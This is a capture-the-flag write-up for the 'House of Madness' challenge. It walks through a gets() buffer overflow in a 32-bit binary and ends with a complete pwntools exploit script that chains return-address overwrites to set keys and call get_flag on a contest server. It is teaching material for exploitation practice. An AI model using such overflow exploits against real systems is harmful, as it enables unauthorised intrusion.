
# House of Madness
> xikhud, 05/04/2020.

## Problem
This is a simple BOF problem.
```cpp
char *room4()
{
  char *result; // eax
  char s1; // [esp+0h] [ebp-28h]
  char s; // [esp+10h] [ebp-18h]

  puts("Wow this room is special. It echoes back what you say!");
  while ( !unlockHiddenRoom4 )
  {
    printf("Press Q to exit: ");
    fgets(&s1, 16, stdin);
    remove_newline(&s1);
    printf("\tYou entered '%s'\n", &s1);
    result = (char *)strcmp(&s1, "Q");
    if ( !result )
    {
      return result;
    }
    if ( !strcmp(&s1, "Stephen") )
    {
      unlockHiddenRoom4 = 1;
    }
  }
  puts("Welcome to the hidden room! Good Luck");
  printf("Enter something: ");
  return gets(&s); // <--------------------- Buffer overflow
}
```
```bash
(env) osboxes@osboxes:~/Desktop$ checksec challenge
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
No canary for this binary, so we can build ROPs to call the function `get_flag` at offset `0x186B` to read the flag from the server.

## Solution
The function `get_flag` only gives us the flag if some conditions are met.
```cpp
  if ( key1 && key2 && !strcmp(key3, "Dormammu") &&
	  !__PAIR__(key4 ^ 1634625381u, dword_405C ^ 5469298u))
  {
    fgets(&s, 64, stream);
    result = printf("Damn you beat the house: %s\n", &s);
  }
```
We must have:

 - `key1 != 0 and key2 != 0`.
 - `key3` points to `"Dormamu"`.
 - `key4 == *(long long*)"Strange"`.

The binary have all the functions that will set these variables to the right values, all we have to do is call them with the right order. After some reversing, I found that the right order is `3->2->1->4->get_flag`.
And the flag is: `auctf{gu3ss_th3_h0us3_1sn't_th4t_m4d}`.

## Final solution 
```python
from pwn import *
from sys import argv
p = 0
if len(argv) < 2:
    p = process('./challenge')
else:
    p = remote('challenges.auctf.com', 30012)
#context.log_level= 'debug'
base = 0x56555000
main = 0x1229
key1,key2,key3,key4 = 0x16DE,0x176E,0x17CD,0x17E9
time = 0
def enter():
        global time
        p.sendlineafter('Your choice: ', '2')
        p.sendlineafter('enter: ', '4')
        p.sendlineafter('Your choice: ', '3')
        if time > 0:
                return
        p.sendlineafter('exit: ', 'Stephen')
        time = 1

enter()

shell = 'A'*28 + p32(base + key3) + p32(base + main)

assert '\n' not in shell
p.sendlineafter('something: ', shell)

shell = 'A'*28 + p32(base + key2) + p32(base + main)
enter()
assert '\n' not in shell
p.sendlineafter('something: ', shell)

shell = 'A'*28 + p32(base + key1) + p32(base + main) + p32(0xFEEDC0DE)
assert '\n' not in shell
enter()
p.sendlineafter('something: ', shell)

shell = 'A'*28 + p32(base + key4) + p32(base + main)
enter()
assert '\n' not in shell
p.sendlineafter('something: ', shell)

shell = 'A'*28 + p32(base + 0x186B) + p32(base + main)
enter()
assert '\n' not in shell
p.sendlineafter('something: ', shell)

p.interactive()
```